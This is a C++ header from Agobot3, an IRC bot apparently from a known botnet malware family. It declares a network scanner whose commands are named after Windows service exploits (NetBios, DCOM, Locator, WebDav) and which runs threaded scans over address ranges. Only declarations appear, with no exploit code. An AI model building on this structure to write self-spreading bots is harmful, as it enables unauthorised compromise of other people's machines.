/*	Agobot3 - a modular IRC bot for Win32 / Linux
	Copyright (C) 2003 Ago

	This program is free software; you can redistribute it and/or
	modify it under the terms of the GNU General Public License
	as published by the Free Software Foundation; either version 2
	of the License, or (at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA. */

#ifndef __SCANNER_H__
#define __SCANNER_H__

#include "cstring.h"
#include "commands.h"
#include "message.h"
#include "cthread.h"

class CScannerAuto
{
public:
	void Init();
};

class CScanner : public CCommandHandler
{
public:
	void Init();

	bool HandleCommand(CMessage *pMsg);
	
	command		 m_cmdNetBios, m_cmdDCOM, m_cmdDCOM2, m_cmdLocator, m_cmdWebDav, m_cmdStop;
	int			 m_iNumThreads;
	bool		 m_bScanning;
};

class CScannerBase : public CThread
{
public:
	CScannerBase() { }
	virtual ~CScannerBase() { }
	virtual void *Run();

	virtual void StartScan(const CString &sHost)=0;
	virtual bool TestHost(const CString &sHost)=0;

	CString		 m_sScannerName;
	CString		 m_sRange;
	CString		 m_sReplyTo;
	int			 m_iTime;

	bool		 m_bSilent;
	bool		 m_bNotice;

	CScanner	*m_pScanner;
};

#endif // __SCANNER_H__
